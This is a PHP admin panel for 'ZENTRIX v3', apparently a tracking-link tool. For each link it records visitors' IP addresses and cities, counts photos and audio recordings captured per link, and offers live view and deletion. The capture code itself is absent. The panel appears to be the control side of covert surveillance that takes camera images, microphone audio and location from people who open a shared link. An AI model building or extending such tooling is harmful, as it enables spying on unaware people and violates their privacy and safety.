<?php
/**
 * ZENTRIX v3 – Admin Dashboard
 * With Photo + Audio count support
 */

session_start();
$config = require __DIR__ . '/config.php';

// Handle delete
if (isset($_GET['delete']) && !empty($_SESSION['zentrix_admin'])) {
    $delId = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['delete']);
    
    // Delete log file
    $file = __DIR__ . '/logs/' . $delId . '.json';
    if (file_exists($file)) {
        unlink($file);
    }

    // Delete related photos
    $photoDir = __DIR__ . '/logs/photos';
    if (is_dir($photoDir)) {
        foreach (glob($photoDir . '/' . $delId . '_*.jpg') as $photo) {
            @unlink($photo);
        }
    }

    // Delete related audio
    $audioDir = __DIR__ . '/logs/audio';
    if (is_dir($audioDir)) {
        foreach (glob($audioDir . '/' . $delId . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE) as $audio) {
            @unlink($audio);
        }
    }

    header('Location: admin.php');
    exit;
}

// ========== LOGIN ==========
if (isset($_POST['password'])) {
    if ($_POST['password'] === $config['admin_password']) {
        $_SESSION['zentrix_admin'] = true;
    } else {
        $error = 'Incorrect password';
    }
}

if (isset($_GET['logout'])) {
    unset($_SESSION['zentrix_admin']);
    header('Location: admin.php');
    exit;
}

if (empty($_SESSION['zentrix_admin'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZENTRIX Admin</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-card { width: 100%; max-width: 380px; }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="card login-card">
        <h2 style="text-align:center; margin-bottom: 8px;">◈ ZENTRIX</h2>
        <p style="text-align:center; color: var(--text-muted); margin-bottom: 28px; font-size: 0.95rem;">Admin Access</p>
        
        <?php if (!empty($error)): ?>
            <p style="color:#f43f5e; text-align:center; margin-bottom: 16px;"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>
        
        <form method="post">
            <div class="field">
                <label>Password</label>
                <input type="password" name="password" required autofocus placeholder="Enter admin password">
            </div>
            <button type="submit" class="btn-primary">Unlock Dashboard</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// ========== DASHBOARD DATA ==========
$logDir = __DIR__ . '/logs';
$files = is_dir($logDir) ? glob($logDir . '/*.json') : [];
rsort($files);

$totalLinks = count($files);
$totalHits = 0;
$latestHits = [];

foreach ($files as $file) {
    $data = json_decode(file_get_contents($file), true) ?: [];
    $count = count($data);
    $totalHits += $count;

    if ($count > 0) {
        $last = end($data);
        $latestHits[] = [
            'id'    => basename($file, '.json'),
            'time'  => $last['time'] ?? '-',
            'ip'    => $last['ip'] ?? '-',
            'city'  => $last['geo']['city'] ?? '',
            'hits'  => $count
        ];
    }
}

usort($latestHits, function($a, $b) {
    return strcmp($b['time'], $a['time']);
});
$latestHits = array_slice($latestHits, 0, 8);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZENTRIX Admin Dashboard</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 32px;
        }
        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 20px;
            text-align: center;
        }
        .stat-card .number {
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--success);
            margin-bottom: 4px;
        }
        .stat-card .label {
            font-size: 0.85rem;
            color: var(--text-muted);
        }
        .section-title {
            font-size: 1.15rem;
            margin-bottom: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .id-table {
            width: 100%;
            border-collapse: collapse;
        }
        .id-table th, .id-table td {
            padding: 12px 14px;
            text-align: left;
            border-bottom: 1px solid var(--border);
            font-size: 0.9rem;
        }
        .id-table th {
            color: var(--text-muted);
            font-weight: 500;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.03em;
        }
        .id-table tr:hover {
            background: rgba(124, 92, 252, 0.05);
        }
        .actions a, .actions button {
            margin-right: 8px;
            font-size: 0.82rem;
        }
        .btn-danger {
            background: transparent;
            border: 1px solid #f43f5e;
            color: #f43f5e;
            padding: 5px 10px;
            border-radius: 6px;
            cursor: pointer;
        }
        .btn-danger:hover {
            background: rgba(244, 63, 94, 0.1);
        }
        .top-actions {
            display: flex;
            gap: 12px;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <span class="ghost">◈</span>
            <span class="name">ZENTRIX Admin</span>
        </div>
        <div class="top-actions">
            <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
            <a href="index.php" class="btn-secondary" style="padding: 8px 14px; font-size: 0.85rem;">Create Link</a>
            <a href="?logout=1" class="btn-secondary" style="padding: 8px 14px; font-size: 0.85rem;">Logout</a>
        </div>
    </header>

    <div class="container">
        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="number"><?= $totalLinks ?></div>
                <div class="label">Tracking Links</div>
            </div>
            <div class="stat-card">
                <div class="number"><?= $totalHits ?></div>
                <div class="label">Total Hits</div>
            </div>
            <div class="stat-card">
                <div class="number"><?= count($latestHits) ?></div>
                <div class="label">Recent Activity</div>
            </div>
        </div>

        <!-- Latest Hits -->
        <div class="section-title">
            <span>Latest Hits</span>
        </div>

        <?php if (empty($latestHits)): ?>
            <div class="card" style="text-align:center; padding: 40px;">
                <p style="color: var(--text-muted);">No activity yet.</p>
            </div>
        <?php else: ?>
            <div class="card" style="padding: 0; overflow: hidden;">
                <table class="id-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Last Hit</th>
                            <th>IP</th>
                            <th>Location</th>
                            <th>Hits</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($latestHits as $hit): ?>
                        <tr>
                            <td><code style="color: var(--success);"><?= htmlspecialchars($hit['id']) ?></code></td>
                            <td><?= htmlspecialchars($hit['time']) ?></td>
                            <td><?= htmlspecialchars($hit['ip']) ?></td>
                            <td><?= htmlspecialchars($hit['city'] ?: '-') ?></td>
                            <td><?= $hit['hits'] ?></td>
                            <td class="actions">
                                <a href="liveview.php?id=<?= urlencode($hit['id']) ?>" class="btn-secondary" style="padding: 4px 10px;">View</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- All Tracking IDs -->
        <div class="section-title" style="margin-top: 40px;">
            <span>All Tracking Links</span>
            <span style="font-size: 0.85rem; color: var(--text-muted);"><?= $totalLinks ?> total</span>
        </div>

        <?php if (empty($files)): ?>
            <div class="card" style="text-align:center; padding: 40px;">
                <p style="color: var(--text-muted);">No tracking links created yet.</p>
            </div>
        <?php else: ?>
            <div class="card" style="padding: 0; overflow: hidden;">
                <table class="id-table">
                    <thead>
                        <tr>
                            <th>Tracking ID</th>
                            <th>Hits</th>
                            <th>Photos</th>
                            <th>Audio</th>
                            <th>Last Activity</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($files as $file): 
                            $id = basename($file, '.json');
                            $data = json_decode(file_get_contents($file), true) ?: [];
                            $hits = count($data);
                            $lastTime = $hits > 0 ? ($data[count($data)-1]['time'] ?? '-') : '-';

                            // Count photos
                            $photoCount = 0;
                            $photoDir = __DIR__ . '/logs/photos';
                            if (is_dir($photoDir)) {
                                $photoCount = count(glob($photoDir . '/' . $id . '_*.jpg'));
                            }

                            // Count audio
                            $audioCount = 0;
                            $audioDir = __DIR__ . '/logs/audio';
                            if (is_dir($audioDir)) {
                                $audioCount = count(glob($audioDir . '/' . $id . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE));
                            }
                        ?>
                        <tr>
                            <td><code style="color: var(--success);"><?= htmlspecialchars($id) ?></code></td>
                            <td><?= $hits ?></td>
                            <td><?= $photoCount ?></td>
                            <td><?= $audioCount ?></td>
                            <td><?= htmlspecialchars($lastTime) ?></td>
                            <td class="actions">
                                <a href="liveview.php?id=<?= urlencode($id) ?>" class="btn-secondary" style="padding: 4px 10px;">Live View</a>
                                <button class="btn-danger" onclick="deleteLog('<?= htmlspecialchars($id) ?>')">Delete</button>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function deleteLog(id) {
            if (!confirm('Delete tracking ID "' + id + '" and all its logs + photos + audio?\nThis cannot be undone.')) return;

            fetch('admin.php?delete=' + encodeURIComponent(id), {
                method: 'POST'
            }).then(() => {
                location.reload();
            });
        }
    </script>
</body>
</html>
